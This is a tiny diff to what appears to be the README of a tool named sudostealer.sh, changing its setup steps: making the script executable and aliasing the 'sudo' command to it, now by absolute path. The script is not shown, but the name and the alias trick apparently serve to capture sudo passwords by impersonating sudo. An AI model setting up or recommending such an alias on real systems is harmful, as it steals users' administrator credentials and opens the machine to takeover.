@@ -11,4 +11,4 @@ Make it executeable:
 ```chmod +x sudostealer.sh```
 
 Create an alias:
-```alias sudo="./sudostealer.sh"```
+```alias sudo="/PathToFile/sudostealer.sh"```
